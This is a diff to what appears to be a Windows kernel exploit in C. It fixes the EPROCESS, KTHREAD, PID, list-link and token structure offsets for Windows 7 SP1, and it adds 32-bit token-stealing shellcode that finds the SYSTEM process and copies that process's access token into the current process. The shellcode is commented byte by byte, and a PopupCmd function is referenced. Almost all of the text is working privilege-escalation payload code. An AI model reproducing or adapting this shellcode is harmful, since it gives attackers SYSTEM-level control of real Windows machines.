@@ -201,18 +201,18 @@ void PopupCmd()
 #define PROCESSID_OFFSET  "\xe0\x02"  // 0x02e0
 #define FLINK_OFFSET      "\xe8\x02"  // 0x02e8
 #define TOKEN_OFFSET      "\x48\x03"  // 0x0348
-#define SYSTEM_PID        "\x04"
+#define SYSTEM_PID        "\x04"      // 0x0004
 #endif
 
 #elif defined(__WIN7SP1__)
 
 #if defined(__X86_32__)
-#define KTHREAD_OFFSET    "\x24\x01"   // 0x124
-#define EPROCESS_OFFSET   "\x50\x05"   // 0x050
-#define PID_OFFSET        "\xb4\x00"   // 0x0B4
-#define FLINK_OFFSET      "\xb8\x00"   // 0x0B8
-#define TOKEN_OFFSET      "\xf8\x00"   // 0x0F8
-#define SYSTEM_PID        "\x04"       // 0x004
+#define KTHREAD_OFFSET    "\x24\x01"   // 0x0124
+#define EPROCESS_OFFSET   "\x50"       // 0x50
+#define PID_OFFSET        "\xb4\x00"   // 0x00B4
+#define FLINK_OFFSET      "\xb8\x00"   // 0x00B8
+#define TOKEN_OFFSET      "\xf8\x00"   // 0x00F8
+#define SYSTEM_PID        "\x04"       // 0x04
 #endif
 
 // TODO: get more offsets from others Windows versions
@@ -241,9 +241,27 @@ const char StealTokenShellcode[] = ""
         "\x59"                                                      // pop rcx
         "\x5b"                                                      // pop rbx
         "\x58"                                                      // pop rax
-        "\x58\x58\x58\x58\x58"                                      // pop rax; pop rax; pop rax; pop rax; pop rax;
+        "\x48\x83\xc4\x28"                                          // add rsp, 40
         "\x48\x31\xc0"                                              // xor rax, rax
         "\xc3"                                                      // ret
+#else
+	"\x60"                                                      // pushad
+	"\x64\xa1" KTHREAD_OFFSET "\x00\x00"                        // mov eax, fs:[KTHREAD_OFFSET]
+	"\x8b\x40" EPROCESS_OFFSET                                  // mov eax, [eax + EPROCESS_OFFSET]
+	"\x89\xc1"                                                  // mov ecx, eax
+	"\x8b\x98" TOKEN_OFFSET "\x00\x00"                          // mov ebx, [eax + EPROCESS_TOKEN]
+	"\xba" SYSTEM_PID "\x00\x00\x00"                            // mov edx, 4
+	"\x8b\x80"FLINK_OFFSET"\x00\x00"                            // mov eax, [eax + FLINK_OFFSET]
+	"\x2d" FLINK_OFFSET "\x00\x00"                              // sub eax, FLINK_OFFSET
+	"\x39\x90" PID_OFFSET "\x00\x00"                            // cmp[eax + PID_OFFSET], edx
+	"\x75\xed"                                                  // jne -17
+	"\x8b\x90" TOKEN_OFFSET "\x00\x00"                          // mov edx, [eax + TOKEN_OFFSET]
+	"\x89\x91" TOKEN_OFFSET "\x00\x00"                          // mov[ecx + TOKEN_OFFSET], edx
+	"\x61"                                                      // popad
+	"\x31\xc0"                                                  // xor eax, eax
+	"\x83\xc4\x0c"                                              // add esp, 12
+	"\x5d"                                                      // pop ebp
+	"\xc2\x08\x00"                                              // ret 8
 #endif
         "";
 
